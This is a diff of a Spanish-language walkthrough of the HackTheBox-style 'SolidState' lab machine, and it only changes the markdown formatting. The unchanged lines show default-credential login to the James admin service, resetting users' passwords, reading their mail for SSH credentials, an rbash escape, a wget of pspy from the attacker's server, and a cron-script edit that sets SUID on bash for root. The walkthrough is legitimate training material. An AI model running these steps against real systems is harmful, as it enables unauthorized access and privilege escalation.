@@ -31,13 +31,13 @@ image:
   
 ## Descripción
 
-SolidState es una máquina easy linux, nos logueamos con las credenciales por defecto en el servicio RSIP y les cambiamos la `contraseña varios usuarios`, posteriormente leemos los correos de estos usuarios accediendo al servicio POP3 obteniendo así las credenciales de SSH de un usuario y ganando acceso así a la máquina víctima. Al ingresar a la máquina víctima escapamos de una restricted bash y abusando de una tarea cron nos convertimos en usuario root 
+`SolidState` es una máquina `easy linux`, nos `logueamos` con las `credenciales` por `defecto` en el `servicio RSIP` y les `cambiamos` la `contraseña` varios `usuarios`, posteriormente `leemos` los `correos` de estos `usuarios` accediendo al `servicio POP3` obteniendo así las `credenciales` de `SSH` de un usuario y `ganando acceso` así a la máquina víctima. Al ingresar a la máquina víctima `escapamos` de una `restricted bash` y abusando de una `tarea cron` nos convertimos en usuario `root` 
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.188.225
@@ -53,7 +53,7 @@ rtt min/avg/max/mdev = 55.869/56.753/58.344/1.127 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.188.225 -oG openPorts
@@ -84,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds
            Raw packets sent: 67032 (2.949MB) | Rcvd: 67045 (2.682MB)
 ```
 
-Se procede a realizar un análisis de `detección de servicios y la identificación de versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p22,25,80,110,119,4555 10.129.188.225 -oN services
@@ -114,7 +114,7 @@ Nmap done: 1 IP address (1 host up) scanned in 377.40 seconds
 
 ## RSIP Enumeration
 
-Nos conectamos usando las credenciales por defecto `root:root`
+Nos `conectamos` usando las `credenciales` por defecto `root:root`
 
 ```
 # nc -nv 10.129.188.225 4555
@@ -148,7 +148,7 @@ quit
 Bye
 ```
 
-Listamos usuarios y les cambiamos la `contraseña` a todos ellos
+`Listamos usuarios` y les `cambiamos` la `contraseña` a todos ellos
 
 ```
 # telnet 10.129.188.225 4555
@@ -183,7 +183,7 @@ Password for mailadmin reset
 
 ## POP3 Enumeration
 
-Nos conectamos como el usuario mindy y vemos los mensajes que tiene en la bandeja de entrada del correo electrónico
+Nos `conectamos` como el usuario `mindy` y `vemos` los `mensajes` que tiene en la `bandeja de entrada` del correo electrónico
 
 ```
 # telnet 10.129.188.225 110
@@ -255,7 +255,7 @@ James
 
 ## Intrusión
 
-Nos conectamos por SSH y escapamos de la restricted bash
+Nos conectamos por `SSH` y `escapamos` de la `restricted bash`
 
 ```
 # ssh mindy@10.129.188.225 bash   
@@ -264,14 +264,14 @@ whoami
 mindy
 ```
 
-Obtenemos las dimensiones de nuestra pantalla 
+Obtenemos las `dimensiones` de nuestra `pantalla` 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el tratamiento a la TTY
+Efectuamos el `tratamiento` a la `TTY`
 
 ```
 # script /dev/null -c bash
@@ -289,21 +289,21 @@ Efectuamos el tratamiento a la TTY
 [ENTER]
 ```
 
-Ya estamos en una TTY completamente interactiva
+Ya estamos en una `TTY` completamente `interactiva`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
 mindy
 ```
 
-Imprimimos el PATH en nuestra máquina
+`Imprimimos` el `PATH` en nuestra máquina
 
 ```
 # echo $PATH            
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/snap/bin:/home/mindy/.local/bin
 ```
 
-Exportamos el PATH a la máquina víctima 
+`Exportamos` el `PATH` a la máquina víctima 
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/snap/bin:/home/mindy/.local/bin
@@ -311,13 +311,13 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ export PATH=$PATH:/usr
 
 ## Privilege Escalation
 
-Nos montamos un servidor http con python en nuestra máquina para transferir el pspy32 a la máquina víctima [https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1). Vamos a analizar los procesos del sistema
+Nos `montamos` un `servidor http` con `python` en nuestra máquina para transferir el `pspy32` a la máquina víctima [https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1). Vamos a `analizar` los `procesos` del `sistema`
 
 ```
 # python -m http.server 80
 ```
 
-Nos descargamos el pspy32
+Nos `descargamos` el `pspy32`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.16.35/pspy32
@@ -332,7 +332,7 @@ pspy64                                        100%[=============================
 2024-08-02 13:17:17 (834 KB/s) - ‘pspy32’ saved [3104768/3104768]
 ```
 
-Ejecutamos pspy y encontramos que el usuario root está ejecutando un script que se encuentra en `/opt`
+`Ejecutamos pspy` y encontramos que el usuario `root` está `ejecutando` un `script` que se encuentra en `/opt`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32
@@ -358,7 +358,7 @@ done
 2024/08/02 13:24:01 CMD: UID=0     PID=8623   | sh -c rm -r /tmp/*  
 ```
 
-Podemos modificar el archivo para que nos spawnee una shell
+Podemos `modificar` el `archivo` para que nos `spawnee` una `shell`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l
@@ -375,7 +375,7 @@ except:
      sys.exit()
 ```
 
-Modificamos el archivo `tmp.py para que le de permisos SUID a la bash`
+`Modificamos` el archivo `tmp.py` para que le de permisos `SUID` a la `bash`
 
 ```
 #!/usr/bin/env python
@@ -387,7 +387,7 @@ except:
      sys.exit()
 ```
 
-Ejecutamos este comando para que cada segundo nos indique el estado de la bash
+`Ejecutamos` este `comando` para que `cada segundo` nos `indique` el `estado` de la `bash`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ watch -n 1 -c -x ls -l /bin/bash
@@ -395,7 +395,7 @@ Every 1.0s: ls -l /bin/bash                                                     
 -rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
 ```
 
-Nos convertimos en usuario root
+Nos `convertimos` en usuario `root`
 
 ```
 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ bash -p
